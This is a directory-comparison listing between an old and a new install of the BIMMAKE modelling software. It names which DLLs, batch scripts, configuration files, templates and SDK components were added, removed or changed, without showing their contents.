Only in C:/compare/BIMMAKE/ComponentEditor/Templates/GFCFamily: 独立基础三台有杯口.gac
Only in C:/compare/BIMMAKE/ComponentEditor/Templates/GFCFamily: 独立基础双层带坡.gac
Only in C:/compare/BIMMAKE/ComponentEditor/Templates/GFCFamily: 等高砖大放脚独立基础.gac
Only in C:/compare/BIMMAKE/ComponentEditor/Templates/GFCFamily: 锥台杯形独立基础.gac
Only in C:/compare/BIMMAKE/ComponentEditor/Templates/GFCFamily: 顶偏心矩形独立基础.gac
Files C:/compare/BIMMAKE.old/ComponentEditorUiConfiguration.dll and C:/compare/BIMMAKE/ComponentEditorUiConfiguration.dll differ
Files C:/compare/BIMMAKE.old/ComponentEditorUiPlatform.dll and C:/compare/BIMMAKE/ComponentEditorUiPlatform.dll differ
Only in C:/compare/BIMMAKE: CopyLibraries.bat
Files C:/compare/BIMMAKE.old/CopyTemplates.bat and C:/compare/BIMMAKE/CopyTemplates.bat differ
Only in C:/compare/BIMMAKE: Crx.dll
Only in C:/compare/BIMMAKE: CrxDb.dll
Only in C:/compare/BIMMAKE: CrxGe.dll
Only in C:/compare/BIMMAKE: CrxSpt.dll
Only in C:/compare/BIMMAKE: DbAnnotate.dll
Only in C:/compare/BIMMAKE: DbBase.dll
Only in C:/compare/BIMMAKE: DbBom.dll
Only in C:/compare/BIMMAKE: DbCurve.dll
Only in C:/compare/BIMMAKE: DbEntity.dll
Only in C:/compare/BIMMAKE: DbStandard.dll
Only in C:/compare/BIMMAKE: DbStyle.dll
Only in C:/compare/BIMMAKE: DbText.dll
Only in C:/compare/BIMMAKE: Debug.ini
Only in C:/compare/BIMMAKE: DeleteLibraries.bat
Only in C:/compare/BIMMAKE: DftConfig.dll
Only in C:/compare/BIMMAKE: DftDb.dll
Files C:/compare/BIMMAKE.old/FamilyCategories.xml and C:/compare/BIMMAKE/FamilyCategories.xml differ
Files C:/compare/BIMMAKE.old/FamilyDialogLauout.xml and C:/compare/BIMMAKE/FamilyDialogLauout.xml differ
Only in C:/compare/BIMMAKE: FillPatternFileApiTestData
Files C:/compare/BIMMAKE.old/GGPMaterialService.dll and C:/compare/BIMMAKE/GGPMaterialService.dll differ
Files C:/compare/BIMMAKE.old/GGPMaterialUI.dll and C:/compare/BIMMAKE/GGPMaterialUI.dll differ
Only in C:/compare/BIMMAKE.old: GPUDriverConfig.ini
Files C:/compare/BIMMAKE.old/GVideoFFmpeg.dll and C:/compare/BIMMAKE/GVideoFFmpeg.dll differ
Only in C:/compare/BIMMAKE: GbmpModel.dll
Files C:/compare/BIMMAKE.old/Gcmp3ds.dll and C:/compare/BIMMAKE/Gcmp3ds.dll differ
Files C:/compare/BIMMAKE.old/GcmpApplication.dll and C:/compare/BIMMAKE/GcmpApplication.dll differ
Files C:/compare/BIMMAKE.old/GcmpApplicationImpl.dll and C:/compare/BIMMAKE/GcmpApplicationImpl.dll differ
Files C:/compare/BIMMAKE.old/GcmpApplicationInterface.dll and C:/compare/BIMMAKE/GcmpApplicationInterface.dll differ
Files C:/compare/BIMMAKE.old/GcmpCommandAction.dll and C:/compare/BIMMAKE/GcmpCommandAction.dll differ
Files C:/compare/BIMMAKE.old/GcmpCommonDraw.dll and C:/compare/BIMMAKE/GcmpCommonDraw.dll differ
Files C:/compare/BIMMAKE.old/GcmpCommonEdit.dll and C:/compare/BIMMAKE/GcmpCommonEdit.dll differ
Files C:/compare/BIMMAKE.old/GcmpDebug.dll and C:/compare/BIMMAKE/GcmpDebug.dll differ
Only in C:/compare/BIMMAKE: GcmpDrawingEdit.dll
Only in C:/compare/BIMMAKE: GcmpDrawingText.dll
Files C:/compare/BIMMAKE.old/GcmpDwgDxf.dll and C:/compare/BIMMAKE/GcmpDwgDxf.dll differ
Files C:/compare/BIMMAKE.old/GcmpGuiInterface.dll and C:/compare/BIMMAKE/GcmpGuiInterface.dll differ
Only in C:/compare/BIMMAKE: GcmpGuiMainFrame.dll
Files C:/compare/BIMMAKE.old/GcmpGuiQt.dll and C:/compare/BIMMAKE/GcmpGuiQt.dll differ
Files C:/compare/BIMMAKE.old/GcmpIntrinsicGuids.json and C:/compare/BIMMAKE/GcmpIntrinsicGuids.json differ
Files C:/compare/BIMMAKE.old/GcmpJournal.dll and C:/compare/BIMMAKE/GcmpJournal.dll differ
Files C:/compare/BIMMAKE.old/GcmpLocatorCommands.dll and C:/compare/BIMMAKE/GcmpLocatorCommands.dll differ
Files C:/compare/BIMMAKE.old/GcmpSkpGGP.dll and C:/compare/BIMMAKE/GcmpSkpGGP.dll differ
Files C:/compare/BIMMAKE.old/GcmpSkpInterface.dll and C:/compare/BIMMAKE/GcmpSkpInterface.dll differ
Only in C:/compare/BIMMAKE: GcmpSocketPortConfigData.dll
Files C:/compare/BIMMAKE.old/GcmpTestFamily.dll and C:/compare/BIMMAKE/GcmpTestFamily.dll differ
Files C:/compare/BIMMAKE.old/GcmpThirdPartyUpdate.dll and C:/compare/BIMMAKE/GcmpThirdPartyUpdate.dll differ
Only in C:/compare/BIMMAKE: GcmpUiCommandAction.dll
Files C:/compare/BIMMAKE.old/GcmpUiDrawingExportFamily.dll and C:/compare/BIMMAKE/GcmpUiDrawingExportFamily.dll differ
Files C:/compare/BIMMAKE.old/GcmpUiPlatform.dll and C:/compare/BIMMAKE/GcmpUiPlatform.dll differ
Files C:/compare/BIMMAKE.old/GcmpUiPlatformFamily.dll and C:/compare/BIMMAKE/GcmpUiPlatformFamily.dll differ
Only in C:/compare/BIMMAKE: GcmpUiView.dll
Only in C:/compare/BIMMAKE: GcmpUiViewInterface.dll
Files C:/compare/BIMMAKE.old/GcmpViewCommands.dll and C:/compare/BIMMAKE/GcmpViewCommands.dll differ
Files C:/compare/BIMMAKE.old/GmAPITest.dll and C:/compare/BIMMAKE/GmAPITest.dll differ
Files C:/compare/BIMMAKE.old/GmCloudStorage.dll and C:/compare/BIMMAKE/GmCloudStorage.dll differ
Files C:/compare/BIMMAKE.old/GmCloudStorageQtImp.dll and C:/compare/BIMMAKE/GmCloudStorageQtImp.dll differ
Files C:/compare/BIMMAKE.old/GmConstruction.dll and C:/compare/BIMMAKE/GmConstruction.dll differ
Files C:/compare/BIMMAKE.old/GmDataSynchronization.dll and C:/compare/BIMMAKE/GmDataSynchronization.dll differ
Files C:/compare/BIMMAKE.old/GmInplaceEdit.dll and C:/compare/BIMMAKE/GmInplaceEdit.dll differ
Only in C:/compare/BIMMAKE: GmPositioningElements.dll
Files C:/compare/BIMMAKE.old/GmUiCommonComponent.dll and C:/compare/BIMMAKE/GmUiCommonComponent.dll differ
Files C:/compare/BIMMAKE.old/GmUiInplaceEditCommon.dll and C:/compare/BIMMAKE/GmUiInplaceEditCommon.dll differ
Files C:/compare/BIMMAKE.old/GmUiInplaceEditFamily.dll and C:/compare/BIMMAKE/GmUiInplaceEditFamily.dll differ
Files C:/compare/BIMMAKE.old/GmUiModelFamily.dll and C:/compare/BIMMAKE/GmUiModelFamily.dll differ
Only in C:/compare/BIMMAKE: GmUiPlatform.dll
Files C:/compare/BIMMAKE.old/GuxClient.dll and C:/compare/BIMMAKE/GuxClient.dll differ
Files C:/compare/BIMMAKE.old/HardWareInfo.dll and C:/compare/BIMMAKE/HardWareInfo.dll differ
Files C:/compare/BIMMAKE.old/InstallGbmpAddin.exe and C:/compare/BIMMAKE/InstallGbmpAddin.exe differ
Files C:/compare/BIMMAKE.old/InterOpGBMP2014.dll and C:/compare/BIMMAKE/InterOpGBMP2014.dll differ
Files C:/compare/BIMMAKE.old/InterOpGBMP2015.dll and C:/compare/BIMMAKE/InterOpGBMP2015.dll differ
Files C:/compare/BIMMAKE.old/InterOpGBMP2016.dll and C:/compare/BIMMAKE/InterOpGBMP2016.dll differ
Files C:/compare/BIMMAKE.old/InterOpGBMP2017.dll and C:/compare/BIMMAKE/InterOpGBMP2017.dll differ
Files C:/compare/BIMMAKE.old/InterOpGBMP2018.dll and C:/compare/BIMMAKE/InterOpGBMP2018.dll differ
Files C:/compare/BIMMAKE.old/InterOpGBMP2019.dll and C:/compare/BIMMAKE/InterOpGBMP2019.dll differ
Files C:/compare/BIMMAKE.old/InterOpGBMP2020.dll and C:/compare/BIMMAKE/InterOpGBMP2020.dll differ
Files C:/compare/BIMMAKE.old/InterOpGBMPHelper.exe and C:/compare/BIMMAKE/InterOpGBMPHelper.exe differ
Files C:/compare/BIMMAKE.old/InterOpRevitConfig.xml and C:/compare/BIMMAKE/InterOpRevitConfig.xml differ
Files C:/compare/BIMMAKE.old/InterOpRevitFamily.dll and C:/compare/BIMMAKE/InterOpRevitFamily.dll differ
Files C:/compare/BIMMAKE.old/KillProcess.bat and C:/compare/BIMMAKE/KillProcess.bat differ
Only in C:/compare/BIMMAKE: KnlAPIBase.dll
Only in C:/compare/BIMMAKE: KnlModuleManager.dll
Only in C:/compare/BIMMAKE: KnlProfile.dll
Only in C:/compare/BIMMAKE: KnlXmlParser.dll
Only in C:/compare/BIMMAKE: Libraries
Only in C:/compare/BIMMAKE: MDLMechanical.dll
Files C:/compare/BIMMAKE.old/MaterialLibraryApplication.dll and C:/compare/BIMMAKE/MaterialLibraryApplication.dll differ
Files C:/compare/BIMMAKE.old/MaterialUI.dll and C:/compare/BIMMAKE/MaterialUI.dll differ
Files C:/compare/BIMMAKE.old/MjArithmetic.dll and C:/compare/BIMMAKE/MjArithmetic.dll differ
Files C:/compare/BIMMAKE.old/MjCaculateModel.dll and C:/compare/BIMMAKE/MjCaculateModel.dll differ
Files C:/compare/BIMMAKE.old/MjCommon.dll and C:/compare/BIMMAKE/MjCommon.dll differ
Files C:/compare/BIMMAKE.old/MjDeliverables.dll and C:/compare/BIMMAKE/MjDeliverables.dll differ
Files C:/compare/BIMMAKE.old/MjGeometryGGP.dll and C:/compare/BIMMAKE/MjGeometryGGP.dll differ
Only in C:/compare/BIMMAKE.old: MjLicense.dll
Files C:/compare/BIMMAKE.old/MjOperationScaffoldModel.dll and C:/compare/BIMMAKE/MjOperationScaffoldModel.dll differ
Files C:/compare/BIMMAKE.old/MjPracticeModel.dll and C:/compare/BIMMAKE/MjPracticeModel.dll differ
Files C:/compare/BIMMAKE.old/MjQtGuiImplementation.dll and C:/compare/BIMMAKE/MjQtGuiImplementation.dll differ
Only in C:/compare/BIMMAKE.old: MjRichTextEditor.dll
Files C:/compare/BIMMAKE.old/MjScaffoldModel.dll and C:/compare/BIMMAKE/MjScaffoldModel.dll differ
Files C:/compare/BIMMAKE.old/MjShoringScaffoldModel.dll and C:/compare/BIMMAKE/MjShoringScaffoldModel.dll differ
Files C:/compare/BIMMAKE.old/MjStructureComponent.dll and C:/compare/BIMMAKE/MjStructureComponent.dll differ
Only in C:/compare/BIMMAKE.old: MjUIArchitecture.dll
Files C:/compare/BIMMAKE.old/MjUIPlatform.dll and C:/compare/BIMMAKE/MjUIPlatform.dll differ
Files C:/compare/BIMMAKE.old/MjUIScaffoldArrangement.dll and C:/compare/BIMMAKE/MjUIScaffoldArrangement.dll differ
Files C:/compare/BIMMAKE.old/MjUITool.dll and C:/compare/BIMMAKE/MjUITool.dll differ
Only in C:/compare/BIMMAKE.old: Packing4Rendering.dll
Only in C:/compare/BIMMAKE: Peimo.exe
Files C:/compare/BIMMAKE.old/QCefView.dll and C:/compare/BIMMAKE/QCefView.dll differ
Only in C:/compare/BIMMAKE.old: QProfile.txt
Files C:/compare/BIMMAKE.old/QtCommonWidget.dll and C:/compare/BIMMAKE/QtCommonWidget.dll differ
Only in C:/compare/BIMMAKE.old: RecentDocumentPathRecord.xml
Files C:/compare/BIMMAKE.old/RecordInstall.bat and C:/compare/BIMMAKE/RecordInstall.bat differ
Files C:/compare/BIMMAKE.old/RecordUninstall.bat and C:/compare/BIMMAKE/RecordUninstall.bat differ
Files C:/compare/BIMMAKE.old/RemoveFiles.bat and C:/compare/BIMMAKE/RemoveFiles.bat differ
Files C:/compare/BIMMAKE.old/Revision.txt and C:/compare/BIMMAKE/Revision.txt differ
Files C:/compare/BIMMAKE.old/ServiceView.dll and C:/compare/BIMMAKE/ServiceView.dll differ
Only in C:/compare/BIMMAKE/Share/ViewCoreResources/MaterialLibrary/textures: rainTextures
Only in C:/compare/BIMMAKE/Share/ViewCoreResources/MaterialLibrary/textures: rainTexturesAmbient
Only in C:/compare/BIMMAKE/Share/ViewCoreResources/Shaders: DoubleSideShader
Only in C:/compare/BIMMAKE/Share/ViewCoreResources/Shaders: Particle
Only in C:/compare/BIMMAKE/Share/ViewCoreResources/Shaders: Rain
Only in C:/compare/BIMMAKE: SptCx.dll
Only in C:/compare/BIMMAKE: SptCxGe.dll
Only in C:/compare/BIMMAKE: SptCxMath.dll
Only in C:/compare/BIMMAKE: SptGe.dll
Only in C:/compare/BIMMAKE: SptGi.dll
Only in C:/compare/BIMMAKE: SptMath.dll
Only in C:/compare/BIMMAKE: SptNLS.dll
Only in C:/compare/BIMMAKE: SysFactory.dll
Files C:/compare/BIMMAKE.old/Teigha/ACCAMERA_20.8src_14.tx and C:/compare/BIMMAKE/Teigha/ACCAMERA_20.8src_14.tx differ
Files C:/compare/BIMMAKE.old/Teigha/ATEXT_20.8src_14.tx and C:/compare/BIMMAKE/Teigha/ATEXT_20.8src_14.tx differ
Files C:/compare/BIMMAKE.old/Teigha/AcMPolygonObj15_20.8src_14.tx and C:/compare/BIMMAKE/Teigha/AcMPolygonObj15_20.8src_14.tx differ
Only in C:/compare/BIMMAKE/Teigha: GripPoints_20.8src_14.tx
Files C:/compare/BIMMAKE.old/Teigha/ISM_20.8src_14.tx and C:/compare/BIMMAKE/Teigha/ISM_20.8src_14.tx differ
Files C:/compare/BIMMAKE.old/Teigha/PDFiumModule_20.8src_14.tx and C:/compare/BIMMAKE/Teigha/PDFiumModule_20.8src_14.tx differ
Files C:/compare/BIMMAKE.old/Teigha/RText_20.8src_14.tx and C:/compare/BIMMAKE/Teigha/RText_20.8src_14.tx differ
Files C:/compare/BIMMAKE.old/Teigha/RxRasterServices_20.8src_14.tx and C:/compare/BIMMAKE/Teigha/RxRasterServices_20.8src_14.tx differ
Files C:/compare/BIMMAKE.old/Teigha/SCENEOE_20.8src_14.tx and C:/compare/BIMMAKE/Teigha/SCENEOE_20.8src_14.tx differ
Files C:/compare/BIMMAKE.old/Teigha/TD_Alloc_20.8src_14.dll and C:/compare/BIMMAKE/Teigha/TD_Alloc_20.8src_14.dll differ
Only in C:/compare/BIMMAKE/Teigha: TD_Ave_20.8src_14.tx
Files C:/compare/BIMMAKE.old/Teigha/TD_DbCore_20.8src_14.dll and C:/compare/BIMMAKE/Teigha/TD_DbCore_20.8src_14.dll differ
Files C:/compare/BIMMAKE.old/Teigha/TD_DbEntities_20.8src_14.tx and C:/compare/BIMMAKE/Teigha/TD_DbEntities_20.8src_14.tx differ
Files C:/compare/BIMMAKE.old/Teigha/TD_DbIO_20.8src_14.tx and C:/compare/BIMMAKE/Teigha/TD_DbIO_20.8src_14.tx differ
Files C:/compare/BIMMAKE.old/Teigha/TD_DbRoot_20.8src_14.dll and C:/compare/BIMMAKE/Teigha/TD_DbRoot_20.8src_14.dll differ
Files C:/compare/BIMMAKE.old/Teigha/TD_Db_20.8src_14.dll and C:/compare/BIMMAKE/Teigha/TD_Db_20.8src_14.dll differ
Only in C:/compare/BIMMAKE/Teigha: TD_DynBlocks_20.8src_14.tx
Files C:/compare/BIMMAKE.old/Teigha/TD_Ge_20.8src_14.dll and C:/compare/BIMMAKE/Teigha/TD_Ge_20.8src_14.dll differ
Files C:/compare/BIMMAKE.old/Teigha/TD_Gi_20.8src_14.dll and C:/compare/BIMMAKE/Teigha/TD_Gi_20.8src_14.dll differ
Files C:/compare/BIMMAKE.old/Teigha/TD_Gs_20.8src_14.dll and C:/compare/BIMMAKE/Teigha/TD_Gs_20.8src_14.dll differ
Files C:/compare/BIMMAKE.old/Teigha/TD_PdfImport_20.8src_14.tx and C:/compare/BIMMAKE/Teigha/TD_PdfImport_20.8src_14.tx differ
Files C:/compare/BIMMAKE.old/Teigha/TD_Pdfium.dll and C:/compare/BIMMAKE/Teigha/TD_Pdfium.dll differ
Files C:/compare/BIMMAKE.old/Teigha/TD_Root_20.8src_14.dll and C:/compare/BIMMAKE/Teigha/TD_Root_20.8src_14.dll differ
Files C:/compare/BIMMAKE.old/Teigha/TD_SpatialIndex_20.8src_14.dll and C:/compare/BIMMAKE/Teigha/TD_SpatialIndex_20.8src_14.dll differ
Files C:/compare/BIMMAKE.old/Teigha/TD_Zlib.dll and C:/compare/BIMMAKE/Teigha/TD_Zlib.dll differ
Files C:/compare/BIMMAKE.old/Teigha/WipeOut_20.8src_14.tx and C:/compare/BIMMAKE/Teigha/WipeOut_20.8src_14.tx differ
Files C:/compare/BIMMAKE.old/TeighaUtility.dll and C:/compare/BIMMAKE/TeighaUtility.dll differ
Files C:/compare/BIMMAKE.old/UE4JsonExporter.dll and C:/compare/BIMMAKE/UE4JsonExporter.dll differ
Only in C:/compare/BIMMAKE.old: ViewerConfig.ini
Files C:/compare/BIMMAKE.old/ViewerTileMerger.exe and C:/compare/BIMMAKE/ViewerTileMerger.exe differ
Only in C:/compare/BIMMAKE.old: algorithmLog.ini
Files C:/compare/BIMMAKE.old/bimmake_ver.txt and C:/compare/BIMMAKE/bimmake_ver.txt differ
Files C:/compare/BIMMAKE.old/bm_category_and_style_config/BIMMAKECategories.xml and C:/compare/BIMMAKE/bm_category_and_style_config/BIMMAKECategories.xml differ
Files C:/compare/BIMMAKE.old/bm_category_and_style_config/SiteLayoutCategories.xml and C:/compare/BIMMAKE/bm_category_and_style_config/SiteLayoutCategories.xml differ
Only in C:/compare/BIMMAKE/bm_plugin_config/DB: MjOperationScaffoldModel.addin
Only in C:/compare/BIMMAKE/bm_plugin_config: MjUIPlatform.addin
Only in C:/compare/BIMMAKE: en-US
Files C:/compare/BIMMAKE.old/gbmp_gcmp_behavior_config.xml and C:/compare/BIMMAKE/gbmp_gcmp_behavior_config.xml differ
Only in C:/compare/BIMMAKE/gbmp_plugin_config: GcmpInternalTest.addin
Only in C:/compare/BIMMAKE/gbmp_plugin_config: GcmpTest.addin
Only in C:/compare/BIMMAKE.old: gdpcore.1.txt
Only in C:/compare/BIMMAKE.old: gdpcore.txt
Files C:/compare/BIMMAKE.old/journal_config.json and C:/compare/BIMMAKE/journal_config.json differ
Files C:/compare/BIMMAKE.old/qtcefwing.exe and C:/compare/BIMMAKE/qtcefwing.exe differ
Files C:/compare/BIMMAKE.old/sdk/AppFamilyServiceProvider.exe and C:/compare/BIMMAKE/sdk/AppFamilyServiceProvider.exe differ
Files C:/compare/BIMMAKE.old/sdk/AppFamilyServiceProviderImpl.dll and C:/compare/BIMMAKE/sdk/AppFamilyServiceProviderImpl.dll differ
Files C:/compare/BIMMAKE.old/sdk/ArchiAlgo.dll and C:/compare/BIMMAKE/sdk/ArchiAlgo.dll differ
Files C:/compare/BIMMAKE.old/sdk/BmFamilyCustomData.dll and C:/compare/BIMMAKE/sdk/BmFamilyCustomData.dll differ
Only in C:/compare/BIMMAKE/sdk: CGBase.dll
Files C:/compare/BIMMAKE.old/sdk/CategoryAndStyleDataDataBase/GCMPCategories.xml and C:/compare/BIMMAKE/sdk/CategoryAndStyleDataDataBase/GCMPCategories.xml differ
Files C:/compare/BIMMAKE.old/sdk/CmdCore.dll and C:/compare/BIMMAKE/sdk/CmdCore.dll differ
Files C:/compare/BIMMAKE.old/sdk/Common.dll and C:/compare/BIMMAKE/sdk/Common.dll differ
Files C:/compare/BIMMAKE.old/sdk/ExprEngine.dll and C:/compare/BIMMAKE/sdk/ExprEngine.dll differ
Files C:/compare/BIMMAKE.old/sdk/GMath.dll and C:/compare/BIMMAKE/sdk/GMath.dll differ
Files C:/compare/BIMMAKE.old/sdk/GSolver.dll and C:/compare/BIMMAKE/sdk/GSolver.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpActionInterface.dll and C:/compare/BIMMAKE/sdk/GcmpActionInterface.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpAddin.dll and C:/compare/BIMMAKE/sdk/GcmpAddin.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpCollaborationInterface.dll and C:/compare/BIMMAKE/sdk/GcmpCollaborationInterface.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpCommandInterface.dll and C:/compare/BIMMAKE/sdk/GcmpCommandInterface.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpDatabase.dll and C:/compare/BIMMAKE/sdk/GcmpDatabase.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpDatabaseInterface.dll and C:/compare/BIMMAKE/sdk/GcmpDatabaseInterface.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpDbCommonEdit.dll and C:/compare/BIMMAKE/sdk/GcmpDbCommonEdit.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpDevService.dll and C:/compare/BIMMAKE/sdk/GcmpDevService.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpDwgDxfInterface.dll and C:/compare/BIMMAKE/sdk/GcmpDwgDxfInterface.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpFoundation.dll and C:/compare/BIMMAKE/sdk/GcmpFoundation.dll differ
Only in C:/compare/BIMMAKE/sdk: GcmpGUiBaseImpl.dll
Only in C:/compare/BIMMAKE/sdk: GcmpGUiBaseInterface.dll
Files C:/compare/BIMMAKE.old/sdk/GcmpGdcModel.dll and C:/compare/BIMMAKE/sdk/GcmpGdcModel.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpGeometryACIS.dll and C:/compare/BIMMAKE/sdk/GcmpGeometryACIS.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpGeometryGGP.dll and C:/compare/BIMMAKE/sdk/GcmpGeometryGGP.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpGeometryInterface.dll and C:/compare/BIMMAKE/sdk/GcmpGeometryInterface.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpGraphicsNode.dll and C:/compare/BIMMAKE/sdk/GcmpGraphicsNode.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpGraphicsNodeInterface.dll and C:/compare/BIMMAKE/sdk/GcmpGraphicsNodeInterface.dll differ
Only in C:/compare/BIMMAKE/sdk: GcmpGuiMainFrameInterface.dll
Files C:/compare/BIMMAKE.old/sdk/GcmpGuiResourceQt.dll and C:/compare/BIMMAKE/sdk/GcmpGuiResourceQt.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpJournalInterface.dll and C:/compare/BIMMAKE/sdk/GcmpJournalInterface.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpMathInterface.dll and C:/compare/BIMMAKE/sdk/GcmpMathInterface.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpModel.dll and C:/compare/BIMMAKE/sdk/GcmpModel.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpModelInterface.dll and C:/compare/BIMMAKE/sdk/GcmpModelInterface.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpPick.dll and C:/compare/BIMMAKE/sdk/GcmpPick.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpPickInterface.dll and C:/compare/BIMMAKE/sdk/GcmpPickInterface.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpRenderingGGP.dll and C:/compare/BIMMAKE/sdk/GcmpRenderingGGP.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpRenderingInterface.dll and C:/compare/BIMMAKE/sdk/GcmpRenderingInterface.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpSnap.dll and C:/compare/BIMMAKE/sdk/GcmpSnap.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpSnapInterface.dll and C:/compare/BIMMAKE/sdk/GcmpSnapInterface.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpTypeCastGGP.dll and C:/compare/BIMMAKE/sdk/GcmpTypeCastGGP.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpUiInterface.dll and C:/compare/BIMMAKE/sdk/GcmpUiInterface.dll differ
Files C:/compare/BIMMAKE.old/sdk/GcmpUiQtImpl.dll and C:/compare/BIMMAKE/sdk/GcmpUiQtImpl.dll differ
Files C:/compare/BIMMAKE.old/sdk/GdcCommon.dll and C:/compare/BIMMAKE/sdk/GdcCommon.dll differ
Files C:/compare/BIMMAKE.old/sdk/GdcCore.dll and C:/compare/BIMMAKE/sdk/GdcCore.dll differ
Files C:/compare/BIMMAKE.old/sdk/GdcDataStandard.dll and C:/compare/BIMMAKE/sdk/GdcDataStandard.dll differ
Files C:/compare/BIMMAKE.old/sdk/GdcEngine.dll and C:/compare/BIMMAKE/sdk/GdcEngine.dll differ
Files C:/compare/BIMMAKE.old/sdk/GdcJsonSerializer.dll and C:/compare/BIMMAKE/sdk/GdcJsonSerializer.dll differ
Files C:/compare/BIMMAKE.old/sdk/GdcLocalDatabase.dll and C:/compare/BIMMAKE/sdk/GdcLocalDatabase.dll differ
Only in C:/compare/BIMMAKE/sdk: GdcLogging.dll
Files C:/compare/BIMMAKE.old/sdk/GdcNetwork.dll and C:/compare/BIMMAKE/sdk/GdcNetwork.dll differ
Files C:/compare/BIMMAKE.old/sdk/GdcProjectManager.dll and C:/compare/BIMMAKE/sdk/GdcProjectManager.dll differ
Files C:/compare/BIMMAKE.old/sdk/GdcUserManager.dll and C:/compare/BIMMAKE/sdk/GdcUserManager.dll differ
Files C:/compare/BIMMAKE.old/sdk/Geometry.dll and C:/compare/BIMMAKE/sdk/Geometry.dll differ
Files C:/compare/BIMMAKE.old/sdk/GmArchitectureFamily.dll and C:/compare/BIMMAKE/sdk/GmArchitectureFamily.dll differ
Files C:/compare/BIMMAKE.old/sdk/GmCompress.dll and C:/compare/BIMMAKE/sdk/GmCompress.dll differ
Files C:/compare/BIMMAKE.old/sdk/GmCrossDomainMessager.dll and C:/compare/BIMMAKE/sdk/GmCrossDomainMessager.dll differ
Files C:/compare/BIMMAKE.old/sdk/GmFamilyCustomData.dll and C:/compare/BIMMAKE/sdk/GmFamilyCustomData.dll differ
Files C:/compare/BIMMAKE.old/sdk/GmFamilyService.dll and C:/compare/BIMMAKE/sdk/GmFamilyService.dll differ
Files C:/compare/BIMMAKE.old/sdk/GmFamilyServiceInterface.dll and C:/compare/BIMMAKE/sdk/GmFamilyServiceInterface.dll differ
Files C:/compare/BIMMAKE.old/sdk/GmFamilyUpdate.dll and C:/compare/BIMMAKE/sdk/GmFamilyUpdate.dll differ
Files C:/compare/BIMMAKE.old/sdk/GmModelFamily.dll and C:/compare/BIMMAKE/sdk/GmModelFamily.dll differ
Files C:/compare/BIMMAKE.old/sdk/GmProcess.dll and C:/compare/BIMMAKE/sdk/GmProcess.dll differ
Files C:/compare/BIMMAKE.old/sdk/GmValueValidator.dll and C:/compare/BIMMAKE/sdk/GmValueValidator.dll differ
Files C:/compare/BIMMAKE.old/sdk/Hatch.dll and C:/compare/BIMMAKE/sdk/Hatch.dll differ
Files C:/compare/BIMMAKE.old/sdk/LineType.dll and C:/compare/BIMMAKE/sdk/LineType.dll differ
Files C:/compare/BIMMAKE.old/sdk/MaterialCore.dll and C:/compare/BIMMAKE/sdk/MaterialCore.dll differ
Files C:/compare/BIMMAKE.old/sdk/MemoryChunkPager.dll and C:/compare/BIMMAKE/sdk/MemoryChunkPager.dll differ
Only in C:/compare/BIMMAKE/sdk: Mesh.dll
Only in C:/compare/BIMMAKE.old/sdk: QProfile.txt
Files C:/compare/BIMMAKE.old/sdk/RegenCore.dll and C:/compare/BIMMAKE/sdk/RegenCore.dll differ
Files C:/compare/BIMMAKE.old/sdk/RenderSystemAngle.dll and C:/compare/BIMMAKE/sdk/RenderSystemAngle.dll differ
Files C:/compare/BIMMAKE.old/sdk/RenderSystemGL.dll and C:/compare/BIMMAKE/sdk/RenderSystemGL.dll differ
Files C:/compare/BIMMAKE.old/sdk/RichText.dll and C:/compare/BIMMAKE/sdk/RichText.dll differ
Files C:/compare/BIMMAKE.old/sdk/TopoEncoding.dll and C:/compare/BIMMAKE/sdk/TopoEncoding.dll differ
Files C:/compare/BIMMAKE.old/sdk/ViewCore.dll and C:/compare/BIMMAKE/sdk/ViewCore.dll differ
Files C:/compare/BIMMAKE.old/sdk/ViewManager.dll and C:/compare/BIMMAKE/sdk/ViewManager.dll differ
Only in C:/compare/BIMMAKE.old/sdk: ViewerConfig.ini
Only in C:/compare/BIMMAKE.old/sdk: algorithmLog.ini
Only in C:/compare/BIMMAKE/sdk: boost_date_time-vc140-mt-x64-1_72.dll
Files C:/compare/BIMMAKE.old/sdk/bson.dll and C:/compare/BIMMAKE/sdk/bson.dll differ
Files C:/compare/BIMMAKE.old/sdk/common_utilities.dll and C:/compare/BIMMAKE/sdk/common_utilities.dll differ
Only in C:/compare/BIMMAKE/sdk: cpprest140_2_10.dll
Only in C:/compare/BIMMAKE/sdk: datacodes.json
Only in C:/compare/BIMMAKE/sdk: enumcodes.json
Files C:/compare/BIMMAKE.old/sdk/gdc_config.xml and C:/compare/BIMMAKE/sdk/gdc_config.xml differ
Files C:/compare/BIMMAKE.old/sdk/jsoncpp.dll and C:/compare/BIMMAKE/sdk/jsoncpp.dll differ
Files C:/compare/BIMMAKE.old/sdk/libcrypto-1_1-x64.dll and C:/compare/BIMMAKE/sdk/libcrypto-1_1-x64.dll differ
Files C:/compare/BIMMAKE.old/sdk/libssl-1_1-x64.dll and C:/compare/BIMMAKE/sdk/libssl-1_1-x64.dll differ
Only in C:/compare/BIMMAKE/sdk: propertycodes.json
Files C:/compare/BIMMAKE.old/sdk/pugixml.dll and C:/compare/BIMMAKE/sdk/pugixml.dll differ
